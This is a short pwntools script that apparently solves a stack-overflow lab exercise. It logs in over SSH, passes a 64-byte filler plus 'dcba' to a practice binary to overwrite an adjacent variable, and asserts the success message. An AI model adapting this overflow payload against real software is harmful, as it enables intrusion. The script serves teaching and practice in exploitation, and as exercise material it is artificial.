from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

payload = fit({64: 'abcd'[::-1]})

p = s.system([args.BIN, payload])

ret = p.recvline()
assert ret == 'you have correctly got the variable to the right value\n'
